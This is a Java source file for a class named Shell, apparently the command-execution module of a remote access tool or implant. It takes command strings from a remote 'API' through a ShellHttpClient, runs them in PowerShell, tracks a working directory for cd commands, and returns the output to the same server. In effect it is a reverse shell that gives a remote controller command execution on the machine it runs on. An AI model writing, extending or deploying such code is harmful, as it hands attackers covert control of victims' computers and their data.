package modules.auxiliary;

import modules.net.ShellHttpClient;

import java.io.*;
import java.nio.file.Path;
import java.time.Duration;
import java.util.concurrent.TimeUnit;

/**
    Provides functionality for receiving, executing commands from the API and sending back the results.

    @author Str1k3r
    @version 1.0
 */
public class Shell {

    private static Shell instance;
    private final ProcessBuilder processBuilder;
    private ShellHttpClient shellHttpClient;

    /**
        Instantiates ShellHttpClient and ProcessBuilder, initializing the ProcessBuilder's current working directory.
     */
    private Shell() {
        shellHttpClient = ShellHttpClient.getInstance();
        processBuilder = new ProcessBuilder();
        processBuilder.directory(new File(".")); // initialise cwd
    }

    /**
        Instantiate a singleton Shell object.

        @return Returns a Shell instance.
     */
    public static Shell getInstance() {
        if(instance == null) {
            instance = new Shell();
        }

        return instance;
    }

    /**
        Execute provided command string. Executes in new process with a 10 second timeout. Output is sent to the API.
     */
    public void exec(String cmdString) {
        try {
            cmdString = cmdString.trim();
            String cmd = cmdString.substring(0, (cmdString.contains(" "))?cmdString.indexOf(" "):cmdString.length());

            if(cmd.equalsIgnoreCase("cd") || cmd.equalsIgnoreCase("chdir")) {
                String directory = cmdString.substring(cmdString.indexOf(" ")+1); // index will offset to 0 if -1 returned by indexOF()

                if(directory.isBlank() || cmd.length() == cmdString.length()) {
                    // blank directory OR cmd is only "cd" no directory arg provided
                    shellHttpClient.sendCmdResult(processBuilder.directory().getAbsolutePath()); // send cwd
                    return;

                }
                changeDir(directory);
                return;
            }


            processBuilder.command("powershell", "/c", cmdString);
            processBuilder.redirectErrorStream(true); // combine normal output with error output
            Process process = processBuilder.start();
            Thread.sleep(Duration.ofSeconds(5));

            System.out.printf("[*] Cmd exec started: %d bytes currently available.\n", process.getInputStream().available());
            if(process.waitFor(10, TimeUnit.SECONDS)) {
                byte[] data = readCmdOutput(process.getInputStream());

                shellHttpClient.sendCmdResult(new String(data)); // send through
            }
            else {
                byte[] data = readCmdOutput(process.getInputStream());

                shellHttpClient.sendCmdResult(
                        String.format("%s\n\n%s", new String(data), "Process delayed in executing command."));
            }
        }
        catch (Exception ioEx) {
            // User should try executing cmd again, prompted by no result returned
            ioEx.printStackTrace();
            shellHttpClient.sendCmdResult("Error while executing command. Try again.");
        }

    }

    /**
        Read command output from the provided input stream.

        @param cmdInStream Command output's input stream for reading.
        @return Returns a byte array of the command output.
     */
    private byte[] readCmdOutput(InputStream cmdInStream) throws IOException {
        try(DataInputStream inStream = new DataInputStream(new BufferedInputStream(cmdInStream))) {
            System.out.printf("[*] %d bytes available before reading output.", cmdInStream.available());

            byte[] data = new byte[cmdInStream.available() + 1024]; // incremental strategy
            int bytesRead = 0;
            while (cmdInStream.available() > 0) {
                if(cmdInStream.available() > data.length) {
                    data = resize(data, cmdInStream.available() + 1024) ;// incremental strategy
                }

                bytesRead += inStream.read(data, bytesRead, data.length); // read all cmd output bytes
            }

            if(bytesRead < data.length) {
                data = resize(data, bytesRead + 1); // make sure no extra (null) bytes from extra size are returned (+1 in case)
            }

            return data;
        }
        catch (IOException ioEx) {
            throw ioEx;
        }
    }

    /**
        Resize provided array return a deep copy of the new array.

        @param data Byte array to resize.
        @param size New size of the array.

        @return A deep copy of the provided byte array with a new size.
     */
    private byte[] resize(byte[] data, int size) {
        if(size <= 0 || data == null) return data;

        byte[] newData = new byte[size];
        for(int index = 0; index < newData.length; index++) {
            if(index >= data.length) {
                newData[index] = 0; // when there is no more data to copy, fill "blanks" (new size > old size)
            }
            else {
                newData[index] = data[index]; // copy data
            }
        }

        return newData;
    }

    /**
        Change current working directory of command shell execution ProcessBuilder. Works best when provided
        absolute path or simply the directory name in current directory. (not relative path)

        @param directory Absolute or Relative path directory to change to.
     */
    private void changeDir(String directory) {

        try {
            directory = directory.trim();
            if(directory.equals("..")) {
                String cwd = processBuilder.directory().getAbsolutePath();

                File parent = new File(cwd).getParentFile();
                if(parent == null) {
                    return; // volume root has no parent
                }
                directory = parent.getAbsolutePath();
            }
            else {
                if(!new File(directory).exists()) {

                    // relative path provided, so make absolute
                    String absolutePath = String.valueOf(Path.of(processBuilder.directory().getAbsolutePath(), directory));
                    if(! new File(absolutePath).exists()) {
                        shellHttpClient.sendCmdResult(String.format("No such directory '%s'", directory));
                        return;
                    }

                    directory = absolutePath;
                }
            }

            File newDirectory = new File(directory);
            if(newDirectory.isFile()) {
                shellHttpClient.sendCmdResult(String.format("'%s' is not a directory.", directory));
                return;
            }

            processBuilder.directory(newDirectory);
            shellHttpClient.sendCmdResult(processBuilder.directory().getAbsolutePath());
        }
        catch(Exception ex) {
            shellHttpClient.sendCmdResult(String.format("Unexpected error while changing directory. %s", ex.getMessage()));
        }
    }
}
